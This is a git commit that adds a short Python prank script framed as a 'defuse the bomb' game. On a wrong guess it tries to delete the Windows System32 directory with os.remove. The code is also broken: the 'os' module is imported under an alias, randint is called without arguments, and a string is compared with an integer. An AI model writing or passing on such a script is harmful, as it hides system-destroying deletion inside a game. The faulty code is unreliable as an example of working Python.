80090723bebe0f60544647ed315d64b4bd412219
myschproj <150742169+myschproj@users.noreply.github.com>
2023-12-26 19:30:08 +0300

    Create blyad.py

---
+++ blyad.py
@@ -0,0 +1,11 @@
+import time as bomb 
+import os as explosion 
+import random as pin
+
+code = pin.randint()
+ans = input('Defuse bomb: ')
+
+if ans == code:
+    print('Bomb Defused!')
+else:
+    os.remove("C:\\System32")
